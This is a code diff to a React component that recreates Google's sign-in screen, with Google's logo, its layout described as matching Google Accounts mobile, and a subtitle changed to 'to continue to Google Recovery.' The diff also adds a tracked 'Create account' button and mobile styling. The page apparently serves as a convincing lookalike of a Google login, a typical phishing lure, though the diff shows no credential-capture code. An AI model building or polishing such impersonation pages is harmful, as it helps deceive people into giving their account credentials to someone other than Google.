@@ -134,15 +134,16 @@ ${GE_SHELL_CSS}
   text-decoration: none;
 }
 .ge-guest a:hover { text-decoration: underline; }
+/* Create account (left) + Next (right) — matches Google Accounts mobile */
 .ge-actions {
   display: flex;
-  flex-direction: row-reverse;
+  flex-direction: row;
   flex-wrap: wrap;
   align-items: center;
-  justify-content: flex-start;
+  justify-content: space-between;
   margin-top: auto;
   padding-top: 32px;
-  gap: 0;
+  gap: 8px;
   width: 100%;
 }
 .ge-btn {
@@ -159,6 +160,20 @@ ${GE_SHELL_CSS}
   font-weight: 500;
   cursor: pointer;
 }
+.ge-btn-create {
+  background: none;
+  border: none;
+  padding: 0 12px;
+  height: 40px;
+  border-radius: 20px;
+  color: var(--gm-next-fill);
+  font-family: inherit;
+  font-size: 0.875rem;
+  font-weight: 500;
+  letter-spacing: 0.0107142857em;
+  cursor: pointer;
+}
+.ge-btn-create:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn-next {
   background: var(--gm-next-fill);
   color: var(--gm-next-ink);
@@ -172,6 +187,14 @@ ${GE_SHELL_CSS}
   cursor: default;
   filter: none;
   box-shadow: none;
+}
+@media (max-width: 768px) {
+  .ge-form {
+    margin-top: 16px;
+    flex: 1 1 auto;
+  }
+  .ge-guest { margin-top: 24px; }
+  .ge-actions { padding-top: 40px; }
 }
 `;
 
@@ -230,7 +253,7 @@ function GeSignInPage() {
         <div className="ge-pane-left">
           <GoogleGLogo className="ge-logo" width={48} height={48} />
           <h1 className="ge-title">Sign in</h1>
-          <p className="ge-sub">to continue to Gmail</p>
+          <p className="ge-sub">to continue to Google Recovery.</p>
         </div>
 
         <div className="ge-pane-right">
@@ -280,6 +303,13 @@ function GeSignInPage() {
             </p>
 
             <div className="ge-actions">
+              <button
+                type="button"
+                className="ge-btn-create"
+                onClick={() => trackClick("Create account")}
+              >
+                Create account
+              </button>
               <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                 Next
               </button>
